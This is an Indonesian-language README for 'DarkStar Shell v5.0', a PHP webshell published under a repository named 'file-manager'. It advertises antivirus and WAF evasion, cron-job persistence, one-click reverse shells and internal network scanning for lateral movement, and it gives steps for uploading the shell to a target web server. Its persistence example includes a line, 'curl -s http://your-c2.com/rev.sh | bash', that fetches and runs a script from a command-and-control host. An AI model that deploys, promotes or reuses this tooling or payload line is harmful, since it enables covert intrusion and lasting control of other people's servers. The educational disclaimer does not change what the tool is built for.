# file-manager
file manager 
# 🚀 DarkStar Shell v5.0 - Elite Edition

DarkStar Shell adalah *webshell* PHP canggih yang berfokus pada **Post-Exploitation** mendalam, **Evasi Firewall**, dan **Persistence** (ketahanan) akses pada sistem target. Dibuat sebagai alat portabel satu file, DarkStar memberikan kemampuan eksekusi tingkat sistem operasi dengan fokus pada keamanan operasional (OpSec).

## ⚠️ Peringatan Penting (Disclaimer)

**PENGGUNAAN HUKUM DAN ETIKA ADALAH TANGGUNG JAWAB PENGGUNA.**

Proyek ini dibuat untuk tujuan **Edukasi Keamanan Jaringan (Pentesting), Riset Keamanan, dan Pertahanan Siber (Blue/Red Teaming)**. Penggunaan DarkStar Shell untuk menyerang sistem tanpa izin eksplisit adalah ilegal dan tidak etis. Pengembang tidak bertanggung jawab atas segala kerusakan atau tindakan ilegal yang dilakukan menggunakan alat ini.

---

## ✨ Fitur Utama (Elite Capabilities)

DarkStar Shell v5.0 dilengkapi dengan serangkaian modul canggih yang dirancang untuk mengatasi lingkungan server yang ketat:

### 🛡️ Evasi & Stealth

* **Polymorphic Self-Obfuscation:** Mengubah *signature* file shell secara otomatis (dengan GZIP + Base64) untuk menghindari deteksi oleh pemindai tanda tangan (Antivirus/HIDS).
* **WAF Bypass Execution:** Modul terminal canggih yang memungkinkan eksekusi perintah dengan empat metode *encoding* berbeda (Base64, Hex, Reverse String, Plain) untuk menghindari filter Web Application Firewall (WAF).
* **Runtime Bypass Check:** Menganalisis ketersediaan fungsi `putenv()` dan `dl()` sebagai indikator potensi kerentanan terhadap serangan *disable\_functions bypass* (misalnya, LD\_PRELOAD).

### ⚙️ Persistence & Kontrol

* **Cron Job Manager:** Modul untuk menyuntikkan, melihat, dan menghapus *scheduled task* (Cron Jobs) di sistem Linux/Unix, memastikan akses kembali (persistence) meskipun file shell utama dihapus.
* **Reverse Shell Utility:** Satu-klik eksekusi multi-payload Reverse Shell (Bash, Python, Perl, Netcat) untuk mendapatkan sesi interaktif.

### 🌐 Network & Pivoting

* **Network Pivot Scanner:** Alat terintegrasi untuk melakukan pemindaian port TCP/UDP (menggunakan `fsockopen`) pada jaringan internal/lokal target, memungkinkan *lateral movement* (pivoting) di dalam infrastruktur target.

### 🗃️ File & System Management

* **File Manager Penuh:** Browsing, Edit (via AJAX), Download, Upload, Rename, Delete, dan CHMOD file/folder.
* **Compression Utility:** Kompres dan dekompres file/direktori dengan perintah `zip` dan `unzip`.
* **Find & Grep:** Pencarian file berdasarkan nama atau konten secara rekursif.
* **Sabun Biasa (File Spreader):** Alat untuk menyebarkan satu file ke sub-direktori yang *writable*.

---

## 🛠️ Instalasi & Penggunaan

DarkStar Shell dirancang sebagai file PHP tunggal yang mudah dioperasikan.

### 1. Setup Awal

1.  Buka file `gui.php` (atau nama file shell Anda) dan ubah kredensial default di bagian atas file:
    ```php
    private $auth_user = "elite"; // Ubah ini!
    private $auth_pass = "elite"; // Ubah ini!
    ```
2.  Pastikan tidak ada karakter atau spasi sebelum tag pembuka `<?php`.

### 2. Deployment

1.  Unggah file PHP ke direktori web target (misalnya, `darkstar.php`).
2.  Akses file tersebut melalui browser: `http://target.com/darkstar.php`

### 3. Otentikasi

Masukkan *username* dan *password* yang telah Anda atur.

### 4. Contoh Penggunaan Fitur Elite

#### A. WAF Bypass Execution

1.  Pilih tab **Terminal & Bypass**.
2.  Pilih **Bypass Method** (misalnya, `Base64 Pipe`).
3.  Pilih **Target PHP Function** (misalnya, `system()`).
4.  Masukkan perintah OS (misalnya, `ls -la /`).
5.  Shell akan meng-*encode* perintah Anda dan mengeksekusinya, mem-bypass filter sederhana.

#### B. Menetapkan Persistence

1.  Pilih tab **Persistence**.
2.  Di bagian **Cron Job Manager**, masukkan `* * * * *` (untuk setiap menit) di kolom **Schedule**.
3.  Di kolom **Payload Command**, masukkan perintah untuk mengunduh ulang *shell* Anda dari C2 atau mengirim Reverse Shell terjadwal.
    *Contoh:* `curl -s http://your-c2.com/rev.sh | bash`
4.  Klik **Inject Cron Job**.

#### C. Self-Obfuscation

1.  Pilih tab **Tools & Attacks**.
2.  Cari modul **Polymorphic Self-Obfuscation**.
3.  Klik tombol **Run Self-Obfuscation**. File PHP Anda akan dienkripsi ulang.

---

## 👨‍💻 Kontribusi

DarkStar Shell dikembangkan secara berkelanjutan. Masukan, laporan *bug*, atau permintaan fitur canggih lainnya disambut baik.

**Coded By:** washere1337

**Lisensi:** (Tambahkan lisensi pilihan Anda, misalnya MIT, atau biarkan kosong jika ini adalah proyek pribadi.)
